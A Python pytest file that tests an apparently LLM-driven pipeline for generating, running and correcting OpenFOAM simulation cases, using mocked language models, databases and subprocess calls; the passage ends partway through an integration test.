"""
Tests for steps.py module.

Tests:
- Dependencies dataclass
- determine_file_structure
- convert_mesh
- extract_boundaries
- generate_files
- write_files
- run_simulation
- analyze_error
- correct_file
- reflect_on_errors
- check_needs_new_file
- add_new_file
- rewrite_file
- Helper functions
"""

import os
import sys
import json
import tempfile
import pytest
from unittest.mock import Mock, patch, MagicMock

# Add src2 to path for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from state import CaseState
from steps import (
    Dependencies,
    determine_file_structure,
    convert_mesh,
    extract_boundaries,
    generate_files,
    write_files,
    run_simulation,
    analyze_error,
    correct_file,
    reflect_on_errors,
    check_needs_new_file,
    add_new_file,
    rewrite_file,
    _extract_boundaries_from_msh,
    _extract_boundaries_from_polymesh,
    _clean_llm_file_response,
    _fix_dimensions,
)

# Path constants - defined here to avoid conftest import issues
SRC2_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
ROOT_DIR = os.path.dirname(SRC2_DIR)
DATABASE_DIR = os.path.join(ROOT_DIR, "database_OFv24")
DATABASE_EXISTS = os.path.exists(os.path.join(DATABASE_DIR, "processed_merged_OF_cases.json"))


def create_sample_json_files(database_dir):
    """Create sample JSON files for testing file structure determination."""
    os.makedirs(database_dir, exist_ok=True)

    solver_files = {
        "simpleFoam": [
            "0/U", "0/p", "0/k", "0/epsilon",
            "system/controlDict", "system/fvSchemes", "system/fvSolution",
            "constant/transportProperties", "constant/turbulenceProperties",
        ],
        "pimpleFoam": [
            "0/U", "0/p",
            "system/controlDict", "system/fvSchemes", "system/fvSolution",
        ],
    }

    with open(os.path.join(database_dir, "final_OF_solver_required_files.json"), "w") as f:
        json.dump(solver_files, f)

    turb_files = {
        "kEpsilon": ["0/k", "0/epsilon", "0/nut"],
        "kOmegaSST": ["0/k", "0/omega", "0/nut"],
        "SpalartAllmaras": ["0/nuTilda", "0/nut"],
    }

    with open(os.path.join(database_dir, "final_OF_turbulence_required_files.json"), "w") as f:
        json.dump(turb_files, f)

    dimensions = {
        "0/U": "[0 1 -1 0 0 0 0]",
        "0/p": "[0 2 -2 0 0 0 0]",
        "0/p_": "[0 2 -2 0 0 0 0]",  # incompressible variant
        "0/k": "[0 2 -2 0 0 0 0]",
        "0/epsilon": "[0 2 -3 0 0 0 0]",
        "0/omega": "[0 0 -1 0 0 0 0]",
        "0/nut": "[0 2 -1 0 0 0 0]",
        "0/nuTilda": "[0 2 -1 0 0 0 0]",
    }

    with open(os.path.join(database_dir, "OF_case_dimensions.json"), "w") as f:
        json.dump(dimensions, f)

    return database_dir


# =============================================================================
# Test Dependencies
# =============================================================================

class TestDependencies:
    """Tests for Dependencies dataclass."""

    def test_create_dependencies(self):
        """Can create Dependencies with all components."""
        mock_config = Mock()
        mock_llm = Mock()
        mock_database = Mock()

        deps = Dependencies(
            config=mock_config,
            llm=mock_llm,
            database=mock_database,
        )

        assert deps.config == mock_config
        assert deps.llm == mock_llm
        assert deps.database == mock_database


# =============================================================================
# Test determine_file_structure
# =============================================================================

class TestDetermineFileStructure:
    """Tests for determine_file_structure function."""

    def test_returns_basic_system_files(self, tmp_path):
        """Always includes basic system files."""
        state = CaseState(solver="simpleFoam")

        mock_config = Mock()
        mock_config.paths.database_dir = str(tmp_path)  # Empty dir

        deps = Dependencies(
            config=mock_config,
            llm=Mock(),
            database=Mock(),
        )

        update = determine_file_structure(state, deps)

        assert "file_structure" in update
        assert "system/controlDict" in update["file_structure"]
        assert "system/fvSchemes" in update["file_structure"]
        assert "system/fvSolution" in update["file_structure"]

    def test_loads_solver_files(self, tmp_path):
        """Loads files from solver JSON."""
        create_sample_json_files(str(tmp_path))

        state = CaseState(solver="simpleFoam")

        mock_config = Mock()
        mock_config.paths.database_dir = str(tmp_path)

        deps = Dependencies(
            config=mock_config,
            llm=Mock(),
            database=Mock(),
        )

        update = determine_file_structure(state, deps)

        files = update["file_structure"]
        assert "0/U" in files
        assert "0/p" in files

    def test_loads_turbulence_files(self, tmp_path):
        """Loads files for turbulence model."""
        create_sample_json_files(str(tmp_path))

        state = CaseState(solver="simpleFoam", turbulence_model="kEpsilon")

        mock_config = Mock()
        mock_config.paths.database_dir = str(tmp_path)

        deps = Dependencies(
            config=mock_config,
            llm=Mock(),
            database=Mock(),
        )

        update = determine_file_structure(state, deps)

        files = update["file_structure"]
        assert "0/k" in files
        assert "0/epsilon" in files
        assert "0/nut" in files

    def test_handles_missing_solver(self, tmp_path):
        """Handles solver not in database."""
        create_sample_json_files(str(tmp_path))

        state = CaseState(solver="unknownFoam")

        mock_config = Mock()
        mock_config.paths.database_dir = str(tmp_path)

        deps = Dependencies(
            config=mock_config,
            llm=Mock(),
            database=Mock(),
        )

        update = determine_file_structure(state, deps)

        # Should still have basic system files
        assert "system/controlDict" in update["file_structure"]

    @pytest.mark.skipif(not DATABASE_EXISTS, reason="Real database not found")
    def test_with_real_database(self):
        """Works with real database files."""
        from database import ReferenceDatabase

        state = CaseState(solver="simpleFoam", turbulence_model="kEpsilon")

        mock_config = Mock()
        mock_config.paths.database_dir = DATABASE_DIR

        deps = Dependencies(
            config=mock_config,
            llm=Mock(),
            database=ReferenceDatabase.load(DATABASE_DIR),
        )

        update = determine_file_structure(state, deps)

        assert "file_structure" in update
        files = update["file_structure"]
        assert len(files) > 3  # More than just basic system files


# =============================================================================
# Test extract_boundaries
# =============================================================================

class TestExtractBoundaries:
    """Tests for extract_boundaries and related functions."""

    def test_extract_from_msh_file(self, tmp_path):
        """Extracts boundaries from MSH file."""
        msh_content = '''(0 "Zone Sections")
(39 (1 fluid fluid)())
(39 (2 wall WALL)())
(39 (3 inlet INLET)())
(39 (4 outlet OUTLET)())
(39 (5 interior interior_FLUID)())
'''
        msh_path = tmp_path / "mesh.msh"
        msh_path.write_text(msh_content)

        state = CaseState(grid_path=str(msh_path), grid_type="msh")

        update = extract_boundaries(state, Mock())

        boundaries = update["grid_boundaries"]
        assert "WALL" in boundaries
        assert "INLET" in boundaries
        assert "OUTLET" in boundaries
        # Fluid and interior should be filtered out
        assert "fluid" not in boundaries
        assert "interior_FLUID" not in boundaries

    def test_extract_boundaries_filters_fluid_zones(self, tmp_path):
        """Filters out FLUID zones (case-insensitive)."""
        msh_content = '''(0 "Zone Sections")
(39 (1 fluid FLUID)())
(39 (2 solid SOLID)())
(39 (3 wall wall)())
(39 (4 interior main_interior)())
'''
        msh_path = tmp_path / "mesh.msh"
        msh_path.write_text(msh_content)

        boundaries = _extract_boundaries_from_msh(str(msh_path))

        assert "wall" in boundaries
        # These should be filtered
        assert "FLUID" not in boundaries
        assert "SOLID" not in boundaries
        assert "main_interior" not in boundaries

    def test_extract_boundaries_handles_empty_file(self, tmp_path):
        """Handles empty or invalid MSH file."""
        msh_path = tmp_path / "empty.msh"
        msh_path.write_text("")

        boundaries = _extract_boundaries_from_msh(str(msh_path))

        assert boundaries == []

    def test_extract_boundaries_handles_no_zone_section(self, tmp_path):
        """Handles MSH file without Zone Sections."""
        msh_content = "Some other content\nNo zones here"
        msh_path = tmp_path / "mesh.msh"
        msh_path.write_text(msh_content)

        boundaries = _extract_boundaries_from_msh(str(msh_path))

        assert boundaries == []


class TestExtractBoundariesFromPolyMesh:
    """Tests for _extract_boundaries_from_polymesh function."""

    def test_extract_from_boundary_file(self, tmp_path):
        """Extracts boundaries from polyMesh boundary file."""
        boundary_content = """FoamFile
{
    version     2.0;
    format      ascii;
    class       polyBoundaryMesh;
    object      boundary;
}
3
(
inlet
{
    type            patch;
    nFaces          100;
    startFace       1000;
}
outlet
{
    type            patch;
    nFaces          100;
    startFace       1100;
}
wall
{
    type            wall;
    nFaces          500;
    startFace       1200;
}
)
"""
        os.makedirs(tmp_path / "constant" / "polyMesh")
        (tmp_path / "constant" / "polyMesh" / "boundary").write_text(boundary_content)

        boundaries = _extract_boundaries_from_polymesh(str(tmp_path / "constant" / "polyMesh"))

        assert "inlet" in boundaries
        assert "outlet" in boundaries
        assert "wall" in boundaries
        assert "FoamFile" not in boundaries

    def test_handles_missing_boundary_file(self, tmp_path):
        """Handles missing boundary file."""
        boundaries = _extract_boundaries_from_polymesh(str(tmp_path / "nonexistent"))

        assert boundaries == []


# =============================================================================
# Test convert_mesh
# =============================================================================

class TestConvertMesh:
    """Tests for convert_mesh function."""

    def test_skips_polymesh_type(self, tmp_path):
        """Skips conversion for polyMesh type."""
        state = CaseState(
            grid_type="polyMesh",
            output_path=str(tmp_path),
        )

        update = convert_mesh(state, Mock())

        assert update["mesh_converted"] is True

    def test_attempts_msh_conversion(self, tmp_path):
        """Attempts fluentMeshToFoam for MSH type."""
        state = CaseState(
            grid_type="msh",
            grid_path=str(tmp_path / "mesh.msh"),
            output_path=str(tmp_path),
        )

        # Mock deps with docker disabled to use local path
        mock_deps = Mock()
        mock_deps.config.docker.enabled = False

        # Mock subprocess to fail (fluentMeshToFoam not available)
        with patch('steps.tools.subprocess.run') as mock_run:
            mock_run.side_effect = FileNotFoundError()

            update = convert_mesh(state, mock_deps)

            assert update["mesh_converted"] is False


# =============================================================================
# Test _clean_llm_file_response
# =============================================================================

class TestCleanLLMFileResponse:
    """Tests for _clean_llm_file_response function."""

    def test_removes_markdown_code_blocks(self):
        """Removes markdown code block markers."""
        response = '''```cpp
FoamFile
{
    version     2.0;
}
```'''
        cleaned = _clean_llm_file_response(response)

        assert "```" not in cleaned
        assert "FoamFile" in cleaned

    def test_removes_language_specifier(self):
        """Removes language specifier from code blocks."""
        response = '''```foam
some content here
```'''
        cleaned = _clean_llm_file_response(response)

        assert "foam" not in cleaned
        assert "some content here" in cleaned

    def test_handles_no_code_blocks(self):
        """Handles content without code blocks."""
        response = "Just plain content"
        cleaned = _clean_llm_file_response(response)

        assert cleaned == "Just plain content"

    def test_handles_empty_code_block(self):
        """Handles empty code block."""
        response = '''```
```'''
        cleaned = _clean_llm_file_response(response)

        assert "```" not in cleaned

    def test_preserves_content_structure(self):
        """Preserves internal content structure."""
        response = '''```
Line 1
Line 2
    Indented
```'''
        cleaned = _clean_llm_file_response(response)

        assert "Line 1" in cleaned
        assert "Line 2" in cleaned
        assert "Indented" in cleaned


# =============================================================================
# Test _fix_dimensions
# =============================================================================

class TestFixDimensions:
    """Tests for _fix_dimensions function."""

    def test_fixes_known_dimension(self, tmp_path):
        """Fixes dimensions for known fields."""
        # Create dimensions file
        dims = {"0/U": "[0 1 -1 0 0 0 0]"}
        with open(tmp_path / "OF_case_dimensions.json", "w") as f:
            json.dump(dims, f)

        content = '''FoamFile
{
    class       volVectorField;
    object      U;
}
dimensions      [0 0 0 0 0 0 0];
internalField   uniform (0 0 0);
'''
        state = CaseState(solver="simpleFoam")

        mock_config = Mock()
        mock_config.paths.database_dir = str(tmp_path)
        mock_config.openfoam.incompressible_solvers = {"simpleFoam"}

        deps = Dependencies(config=mock_config, llm=Mock(), database=Mock())

        fixed = _fix_dimensions(content, "0/U", state, deps)

        assert "[0 1 -1 0 0 0 0]" in fixed

    def test_leaves_content_unchanged_if_no_dimensions(self, tmp_path):
        """Leaves content unchanged if no dimensions line."""
        content = '''FoamFile
{
    class       dictionary;
    object      controlDict;
}
application simpleFoam;
'''
        state = CaseState(solver="simpleFoam")

        mock_config = Mock()
        mock_config.paths.database_dir = str(tmp_path)

        deps = Dependencies(config=mock_config, llm=Mock(), database=Mock())

        fixed = _fix_dimensions(content, "system/controlDict", state, deps)

        assert fixed == content

    def test_handles_incompressible_pressure(self, tmp_path):
        """Uses incompressible dimensions for p with incompressible solver."""
        dims = {
            "0/p": "[1 -1 -2 0 0 0 0]",  # Compressible
            "0/p_": "[0 2 -2 0 0 0 0]",  # Incompressible
        }
        with open(tmp_path / "OF_case_dimensions.json", "w") as f:
            json.dump(dims, f)

        content = 'dimensions      [0 0 0 0 0 0 0];'
        state = CaseState(solver="simpleFoam")

        mock_config = Mock()
        mock_config.paths.database_dir = str(tmp_path)
        mock_config.openfoam.incompressible_solvers = {"simpleFoam"}

        deps = Dependencies(config=mock_config, llm=Mock(), database=Mock())

        fixed = _fix_dimensions(content, "0/p", state, deps)

        assert "[0 2 -2 0 0 0 0]" in fixed


# =============================================================================
# Test generate_files
# =============================================================================

class TestGenerateFiles:
    """Tests for generate_files function."""

    def test_generates_all_files(self):
        """Generates content for all files in structure."""
        state = CaseState(
            solver="simpleFoam",
            turbulence_model="kOmegaSST",
            file_structure=["0/U", "0/p", "system/controlDict"],
            grid_boundaries=["inlet", "outlet", "wall"],
            description="Test case",
        )

        mock_llm = Mock()
        mock_llm.ask_reasoning.return_value = "FoamFile { version 2.0; }"

        mock_database = Mock()
        mock_database.find_reference_files.return_value = {"sample_0": "reference content"}

        mock_config = Mock()
        mock_config.paths.database_dir = "/tmp"

        deps = Dependencies(
            config=mock_config,
            llm=mock_llm,
            database=mock_database,
        )

        update = generate_files(state, deps)

        # Verify structure
        assert "generated_files" in update
        assert "0/U" in update["generated_files"]
        assert "0/p" in update["generated_files"]
        assert "system/controlDict" in update["generated_files"]

        # Verify LLM was called for each file
        assert mock_llm.ask_reasoning.call_count == 3

        # Verify database was queried for references
        assert mock_database.find_reference_files.call_count == 3

        # Verify content is not empty
        for file_path, content in update["generated_files"].items():
            assert content, f"Content for {file_path} should not be empty"

    def test_generates_files_with_correct_prompts(self):
        """Verifies prompts contain required context."""
        state = CaseState(
            solver="simpleFoam",
            turbulence_model="kOmegaSST",
            file_structure=["0/U"],
            grid_boundaries=["inlet", "outlet", "wall"],
            description="Flow over cylinder",
        )

        mock_llm = Mock()
        mock_llm.ask_reasoning.return_value = "FoamFile content"

        mock_database = Mock()
        mock_database.find_reference_files.return_value = {}

        mock_config = Mock()
        mock_config.paths.database_dir = "/tmp"

        deps = Dependencies(
            config=mock_config,
            llm=mock_llm,
            database=mock_database,
        )

        generate_files(state, deps)

        # Verify prompt contains key information
        call_args = mock_llm.ask_reasoning.call_args[0][0]
        assert "0/U" in call_args, "Prompt should contain file path"
        assert "simpleFoam" in call_args, "Prompt should contain solver"
        assert "kOmegaSST" in call_args, "Prompt should contain turbulence model"
        assert "inlet" in call_args, "Prompt should contain boundaries"


# =============================================================================
# Test write_files
# =============================================================================

class TestWriteFiles:
    """Tests for write_files function."""

    def test_writes_files_to_disk(self, tmp_path):
        """Writes generated files to disk."""
        state = CaseState(
            output_path=str(tmp_path),
            generated_files={
                "0/U": "velocity content",
                "0/p": "pressure content",
            },
        )

        update = write_files(state, Mock())

        assert (tmp_path / "0" / "U").exists()
        assert (tmp_path / "0" / "p").exists()
        assert (tmp_path / "0" / "U").read_text() == "velocity content"

    def test_creates_directories(self, tmp_path):
        """Creates necessary directories."""
        state = CaseState(
            output_path=str(tmp_path),
            generated_files={
                "system/fvSchemes": "schemes content",
                "constant/transportProperties": "transport content",
            },
        )

        write_files(state, Mock())

        assert (tmp_path / "system").is_dir()
        assert (tmp_path / "constant").is_dir()


# =============================================================================
# Test run_simulation
# =============================================================================

class TestRunSimulation:
    """Tests for run_simulation function."""

    def test_returns_success_on_zero_exit(self, tmp_path):
        """Returns success when subprocess exits with 0."""
        # Create controlDict
        os.makedirs(tmp_path / "system")
        control_dict = "application simpleFoam;"
        (tmp_path / "system" / "controlDict").write_text(control_dict)

        state = CaseState(
            solver="simpleFoam",
            output_path=str(tmp_path),
            file_structure=["system/controlDict"],
        )

        # Mock deps with docker disabled to use local path
        mock_deps = Mock()
        mock_deps.config.docker.enabled = False

        with patch('steps.tools.subprocess.run') as mock_run:
            mock_run.return_value = Mock(returncode=0, stdout="End\n", stderr="")

            update = run_simulation(state, mock_deps)

            # Verify result
            assert update.get("success") is True
            assert update.get("completed") is True

            # Verify subprocess was actually called
            mock_run.assert_called_once()

            # Verify solver command was used
            call_args = mock_run.call_args
            command = call_args[0][0] if call_args[0] else call_args[1].get("args", [])
            assert "simpleFoam" in str(command), "Should run the correct solver"

    def test_returns_error_on_failure(self, tmp_path):
        """Returns error info on simulation failure."""
        os.makedirs(tmp_path / "system")
        (tmp_path / "system" / "controlDict").write_text("application simpleFoam;")

        state = CaseState(
            solver="simpleFoam",
            output_path=str(tmp_path),
            error_history=[],
        )

        # Mock deps with docker disabled to use local path
        mock_deps = Mock()
        mock_deps.config.docker.enabled = False

        with patch('steps.tools.subprocess.run') as mock_run:
            mock_run.return_value = Mock(
                returncode=1,
                stdout="",
                stderr="FOAM FATAL ERROR: Cannot find entry 'solver' in dictionary"
            )

            update = run_simulation(state, mock_deps)

            # Verify failure detected
            assert update.get("success") is not True
            assert "current_error" in update
            assert len(update["error_history"]) == 1

            # Verify error message is captured
            assert "FOAM FATAL" in update["current_error"]

            # Verify subprocess was called
            mock_run.assert_called_once()

    def test_detects_foam_fatal_in_stdout(self, tmp_path):
        """Detects FOAM FATAL ERROR even when in stdout (not stderr)."""
        os.makedirs(tmp_path / "system")
        (tmp_path / "system" / "controlDict").write_text("application simpleFoam;")

        state = CaseState(
            solver="simpleFoam",
            output_path=str(tmp_path),
            error_history=[],
        )

        mock_deps = Mock()
        mock_deps.config.docker.enabled = False

        with patch('steps.tools.subprocess.run') as mock_run:
            # Some OpenFOAM errors go to stdout
            mock_run.return_value = Mock(
                returncode=0,  # Exit code might be 0 even with errors
                stdout="FOAM FATAL ERROR: Boundary condition not found",
                stderr=""
            )

            update = run_simulation(state, mock_deps)

            # Should detect failure despite returncode=0
            assert update.get("success") is not True
            assert "current_error" in update

    def test_uses_solver_from_controldict(self, tmp_path):
        """Extracts solver from controlDict application field."""
        os.makedirs(tmp_path / "system")
        # controlDict specifies pimpleFoam, not simpleFoam
        (tmp_path / "system" / "controlDict").write_text("application pimpleFoam;")

        state = CaseState(
            solver="simpleFoam",  # State says simpleFoam
            output_path=str(tmp_path),
            file_structure=["system/controlDict"],
        )

        mock_deps = Mock()
        mock_deps.config.docker.enabled = False

        with patch('steps.tools.subprocess.run') as mock_run:
            mock_run.return_value = Mock(returncode=0, stdout="", stderr="")

            run_simulation(state, mock_deps)

            # Should use pimpleFoam from controlDict, not simpleFoam from state
            call_args = mock_run.call_args
            command = call_args[0][0] if call_args[0] else call_args[1].get("args", [])
            assert "pimpleFoam" in str(command), "Should use solver from controlDict"


# =============================================================================
# Test analyze_error
# =============================================================================

class TestAnalyzeError:
    """Tests for analyze_error function."""

    def test_identifies_error_file(self):
        """Identifies the file causing the error."""
        state = CaseState(
            current_error="FOAM FATAL ERROR in file system/fvSolution: Cannot find entry",
            file_structure=["0/U", "0/p", "system/fvSolution"],
        )

        mock_llm = Mock()
        mock_llm.ask_instruct.return_value = "system/fvSolution"

        deps = Dependencies(
            config=Mock(),
            llm=mock_llm,
            database=Mock(),
        )

        update = analyze_error(state, deps)

        # Verify correct file identified
        assert update["error_file"] == "system/fvSolution"

        # Verify LLM was called with error context
        mock_llm.ask_instruct.assert_called_once()
        prompt = mock_llm.ask_instruct.call_args[0][0]
        assert "FOAM FATAL ERROR" in prompt, "Prompt should contain error message"
        assert "system/fvSolution" in prompt or "file_structure" in prompt.lower()

    def test_handles_no_error(self):
        """Returns empty update if no error."""
        state = CaseState(current_error=None)

        mock_llm = Mock()
        deps = Dependencies(config=Mock(), llm=mock_llm, database=Mock())

        update = analyze_error(state, deps)

        assert update == {}
        mock_llm.ask_instruct.assert_not_called()

    def test_matches_partial_file_names(self):
        """Finds closest match when LLM returns partial path."""
        state = CaseState(
            current_error="Error in fvSolution",
            file_structure=["0/U", "0/p", "system/fvSolution"],
        )

        mock_llm = Mock()
        mock_llm.ask_instruct.return_value = "fvSolution"  # Partial name

        deps = Dependencies(config=Mock(), llm=mock_llm, database=Mock())

        update = analyze_error(state, deps)

        # Should match to full path
        assert update["error_file"] == "system/fvSolution"


# =============================================================================
# Test correct_file
# =============================================================================

class TestCorrectFile:
    """Tests for correct_file function."""

    def test_corrects_identified_file(self, tmp_path):
        """Corrects the error file."""
        # Create existing file
        os.makedirs(tmp_path / "system")
        (tmp_path / "system" / "fvSolution").write_text("old content")

        state = CaseState(
            error_file="system/fvSolution",
            output_path=str(tmp_path),
            current_error="FOAM FATAL ERROR: Cannot find entry 'solver'",
            solver="simpleFoam",
            generated_files={"system/fvSolution": "old content"},
            correction_trajectory=[],
            grid_boundaries=["inlet", "outlet", "wall"],
        )

        mock_llm = Mock()
        mock_llm.ask_reasoning.return_value = "corrected fvSolution content"

        mock_database = Mock()
        mock_database.find_reference_files.return_value = {"ref": "reference content"}

        deps = Dependencies(
            config=Mock(),
            llm=mock_llm,
            database=mock_database,
        )

        update = correct_file(state, deps)

        # Verify state update
        assert update["generated_files"]["system/fvSolution"] == "corrected fvSolution content"
        assert len(update["correction_trajectory"]) == 1

        # Verify file was actually written to disk
        written_content = (tmp_path / "system" / "fvSolution").read_text()
        assert written_content == "corrected fvSolution content"

        # Verify LLM was called with error context
        mock_llm.ask_reasoning.assert_called_once()
        prompt = mock_llm.ask_reasoning.call_args[0][0]
        assert "FOAM FATAL ERROR" in prompt, "Prompt should contain error message"
        assert "old content" in prompt, "Prompt should contain current file content"

        # Verify trajectory records old and new content
        trajectory_entry = update["correction_trajectory"][0]
        assert "system/fvSolution" in trajectory_entry

    def test_queries_database_for_references(self, tmp_path):
        """Verifies database is queried for reference files."""
        os.makedirs(tmp_path / "0")
        (tmp_path / "0" / "U").write_text("broken U file")

        state = CaseState(
            error_file="0/U",
            output_path=str(tmp_path),
            current_error="Error in U",
            solver="simpleFoam",
            turbulence_model="kOmegaSST",
            generated_files={"0/U": "broken U file"},
            correction_trajectory=[],
            grid_boundaries=["inlet", "outlet"],
        )

        mock_llm = Mock()
        mock_llm.ask_reasoning.return_value = "fixed U"

        mock_database = Mock()
        mock_database.find_reference_files.return_value = {}

        deps = Dependencies(
            config=Mock(),
            llm=mock_llm,
            database=mock_database,
        )

        correct_file(state, deps)

        # Verify database was queried with correct parameters
        mock_database.find_reference_files.assert_called_once()
        call_kwargs = mock_database.find_reference_files.call_args[1]
        assert call_kwargs["target_file"] == "0/U"
        assert call_kwargs["solver"] == "simpleFoam"
        assert call_kwargs["turbulence_model"] == "kOmegaSST"

    def test_handles_no_error_file(self):
        """Returns empty update if no error file."""
        state = CaseState(error_file=None)

        update = correct_file(state, Mock())

        assert update == {}


# =============================================================================
# Test reflect_on_errors
# =============================================================================

class TestReflectOnErrors:
    """Tests for reflect_on_errors function."""

    def test_reflects_on_repeated_errors(self):
        """Generates reflection for repeated errors."""
        state = CaseState(
            error_history=["first error message", "second error message"],
            current_error="second error message",
            correction_trajectory=[
                {"0/U": ["old content", "new content"]},
            ],
            file_structure=["0/U", "0/p"],
            reflection_history=[],
        )

        mock_llm = Mock()
        mock_llm.ask_reasoning.return_value = "Analysis: The solver settings need adjustment"

        deps = Dependencies(
            config=Mock(),
            llm=mock_llm,
            database=Mock(),
        )

        update = reflect_on_errors(state, deps)

        # Verify structure
        assert "reflection_history" in update
        assert len(update["reflection_history"]) == 1

        # Verify LLM was called
        mock_llm.ask_reasoning.assert_called_once()

        # Verify prompt contains error and trajectory context
        prompt = mock_llm.ask_reasoning.call_args[0][0]
        assert "second error message" in prompt, "Prompt should contain current error"
        assert "0/U" in prompt or "Attempt" in prompt, "Prompt should contain trajectory info"

        # Verify reflection entry structure
        reflection_entry = update["reflection_history"][0]
        assert "error" in reflection_entry
        assert "reflection" in reflection_entry
        assert reflection_entry["error"] == "second error message"

    def test_skips_with_few_errors(self):
        """Returns empty if fewer than 2 errors."""
        state = CaseState(error_history=["error 1"])

        # Should not call LLM at all
        mock_llm = Mock()
        deps = Dependencies(config=Mock(), llm=mock_llm, database=Mock())

        update = reflect_on_errors(state, deps)

        assert update == {}
        mock_llm.ask_reasoning.assert_not_called()

    def test_includes_correction_trajectory_in_prompt(self):
        """Verifies correction history is included in reflection prompt."""
        state = CaseState(
            error_history=["error 1", "error 2", "error 3"],
            current_error="error 3",
            correction_trajectory=[
                {"0/U": ["version1", "version2"]},
                {"0/p": ["old_p", "new_p"]},
            ],
            file_structure=["0/U", "0/p"],
            reflection_history=[],
        )

        mock_llm = Mock()
        mock_llm.ask_reasoning.return_value = "Reflection output"

        deps = Dependencies(config=Mock(), llm=mock_llm, database=Mock())

        reflect_on_errors(state, deps)

        prompt = mock_llm.ask_reasoning.call_args[0][0]
        # Should include modification history
        assert "Modified" in prompt or "0/U" in prompt or "0/p" in prompt


# =============================================================================
# Test check_needs_new_file
# =============================================================================

class TestCheckNeedsNewFile:
    """Tests for check_needs_new_file function."""

    def test_detects_missing_file_error(self):
        """Detects 'cannot find file' error."""
        state = CaseState(
            current_error="cannot find file constant/g",
        )

        mock_llm = Mock()
        mock_llm.ask_instruct.return_value = "constant/g"

        deps = Dependencies(
            config=Mock(),
            llm=mock_llm,
            database=Mock(),
        )

        update = check_needs_new_file(state, deps)

        assert update["needs_new_file"] is True
        assert update["new_file_name"] == "constant/g"

    def test_returns_false_for_other_errors(self):
        """Returns False for non-file errors."""
        state = CaseState(
            current_error="FOAM FATAL ERROR: boundary not found",
        )

        update = check_needs_new_file(state, Mock())

        assert update["needs_new_file"] is False

    def test_handles_no_error(self):
        """Returns False if no error."""
        state = CaseState(current_error=None)

        update = check_needs_new_file(state, Mock())

        assert update["needs_new_file"] is False


# =============================================================================
# Test add_new_file
# =============================================================================

class TestAddNewFile:
    """Tests for add_new_file function."""

    def test_adds_new_file(self, tmp_path):
        """Creates a new file."""
        # tmp_path already exists, create a case subdirectory
        case_dir = tmp_path / "case"
        os.makedirs(case_dir, exist_ok=True)

        # Create dimensions file for _fix_dimensions
        (tmp_path / "OF_case_dimensions.json").write_text("{}")

        state = CaseState(
            new_file_name="constant/g",
            output_path=str(case_dir),
            solver="simpleFoam",
            file_structure=["0/U"],
            generated_files={},
            description="Test case",
            grid_boundaries=["inlet", "outlet"],
        )

        mock_llm = Mock()
        mock_llm.ask_reasoning.return_value = "gravity file content"

        mock_database = Mock()
        mock_database.find_reference_files.return_value = {}

        mock_config = Mock()
        mock_config.paths.database_dir = str(tmp_path)
        mock_config.openfoam.incompressible_solvers = {"simpleFoam"}

        deps = Dependencies(
            config=mock_config,
            llm=mock_llm,
            database=mock_database,
        )

        update = add_new_file(state, deps)

        assert "constant/g" in update["file_structure"]
        assert "constant/g" in update["generated_files"]
        assert update["needs_new_file"] is False

    def test_handles_no_new_file_name(self):
        """Returns empty if no new file name."""
        state = CaseState(new_file_name=None)

        update = add_new_file(state, Mock())

        assert update == {}


# =============================================================================
# Test rewrite_file
# =============================================================================

class TestRewriteFile:
    """Tests for rewrite_file function."""

    def test_rewrites_file(self, tmp_path):
        """Completely rewrites problematic file."""
        os.makedirs(tmp_path / "0")
        (tmp_path / "0" / "U").write_text("broken content")

        # Create dimensions file for _fix_dimensions
        (tmp_path / "OF_case_dimensions.json").write_text("{}")

        state = CaseState(
            error_file="0/U",
            output_path=str(tmp_path),
            solver="simpleFoam",
            generated_files={"0/U": "broken content"},
            description="Test case for velocity field",
            grid_boundaries=["inlet", "outlet", "wall"],
        )

        mock_llm = Mock()
        mock_llm.ask_reasoning.return_value = "completely new U content"

        mock_database = Mock()
        mock_database.find_reference_files.return_value = {}

        mock_config = Mock()
        mock_config.paths.database_dir = str(tmp_path)
        mock_config.openfoam.incompressible_solvers = {"simpleFoam"}

        deps = Dependencies(
            config=mock_config,
            llm=mock_llm,
            database=mock_database,
        )

        update = rewrite_file(state, deps)

        # Verify state update
        assert update["generated_files"]["0/U"] == "completely new U content"

        # Verify file was written to disk
        written_content = (tmp_path / "0" / "U").read_text()
        assert written_content == "completely new U content"

        # Verify LLM was called
        mock_llm.ask_reasoning.assert_called_once()

        # Verify prompt contains context for rewriting
        prompt = mock_llm.ask_reasoning.call_args[0][0]
        assert "0/U" in prompt, "Prompt should contain file path"
        assert "simpleFoam" in prompt, "Prompt should contain solver"

        # Verify database was queried for references
        mock_database.find_reference_files.assert_called_once()

    def test_handles_no_error_file(self):
        """Returns empty if no error file."""
        state = CaseState(error_file=None)

        mock_llm = Mock()
        deps = Dependencies(config=Mock(), llm=mock_llm, database=Mock())

        update = rewrite_file(state, deps)

        assert update == {}
        mock_llm.ask_reasoning.assert_not_called()

    def test_rewrite_differs_from_correction(self, tmp_path):
        """Rewrite generates fresh content without seeing old content."""
        os.makedirs(tmp_path / "system")
        (tmp_path / "system" / "fvSchemes").write_text("broken schemes")
        (tmp_path / "OF_case_dimensions.json").write_text("{}")

        state = CaseState(
            error_file="system/fvSchemes",
            output_path=str(tmp_path),
            solver="simpleFoam",
            generated_files={"system/fvSchemes": "broken schemes"},
            description="Test",
            grid_boundaries=["inlet", "outlet"],
        )

        mock_llm = Mock()
        mock_llm.ask_reasoning.return_value = "new fvSchemes"

        mock_database = Mock()
        mock_database.find_reference_files.return_value = {}

        mock_config = Mock()
        mock_config.paths.database_dir = str(tmp_path)
        mock_config.openfoam.incompressible_solvers = {"simpleFoam"}

        deps = Dependencies(config=mock_config, llm=mock_llm, database=mock_database)

        rewrite_file(state, deps)

        # Rewrite prompt should NOT contain the old broken content
        # (unlike correction which includes it for context)
        prompt = mock_llm.ask_reasoning.call_args[0][0]
        assert "broken schemes" not in prompt, "Rewrite should not include old content"


# =============================================================================
# Integration Tests
# =============================================================================

class TestStepsIntegration:
    """Integration tests for steps module."""

    def test_full_file_generation_flow(self, tmp_path):
        """Test complete file generation and writing flow."""
        create_sample_json_files(str(tmp_path / "database"))

        state = CaseState(
            case_name="test_case",
            solver="simpleFoam",
            turbulence_model="kEpsilon",
            output_path=str(tmp_path / "case"),
            grid_boundaries=["inlet", "outlet", "wall"],
            description="Integration test case",
        )

        mock_llm = Mock()
        mock_llm.ask_reasoning.return_value = "Generated OpenFOAM content"

        mock_database = Mock()
        mock_database.find_reference_files.return_value = {}

        mock_config = Mock()
        mock_config.paths.database_dir = str(tmp_path / "database")
